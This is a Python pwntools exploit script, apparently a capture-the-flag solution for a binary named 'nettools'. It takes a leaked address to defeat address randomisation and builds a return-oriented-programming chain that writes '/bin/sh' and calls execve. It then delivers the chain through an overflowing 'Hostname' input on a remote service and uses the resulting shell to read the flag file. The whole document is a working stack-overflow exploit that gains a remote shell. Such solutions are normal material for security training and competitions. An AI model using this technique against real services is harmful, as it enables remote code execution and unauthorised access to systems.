from pwn import *

from struct import pack

context.log_level = 'error'
# p = process('./nettools')
if args["HOST"] and args["PORT"]:
    host = args["HOST"]
    port = args["PORT"]
p = remote(host, port)

p.recvuntil(b"leaked:")
leak = int(p.recvline(), 16)
print(hex(leak))

exec_base = leak - 0x7a03c
ret = exec_base + 0x000000000000901a


IMAGE_BASE_0 = exec_base 
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000ecaa) # 0x000000000000a0ef: pop rax; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x0000000000020bb3) # pop rdx; add byte ptr [rax], al ; ret
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += b'/bin/sh\x00'
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a008)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x0000000000009c18) # 0x0000000000009c18: pop rsi; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x0000000000025adf) # 0x0000000000025adf: syscall;
p.sendlineafter(b">", b"3")
p.sendlineafter(b"Hostname:", b"A"*400 + b"\x00"*8 + p64(ret)*49 + rop)
p.recvline()

p.sendline(b"cat challenge/flag.txt")
output = p.recv()
print(output.decode(errors='ignore').strip())


with open("output.txt", "wb") as f:
    f.write(output)

p.close()
# p.interactive()
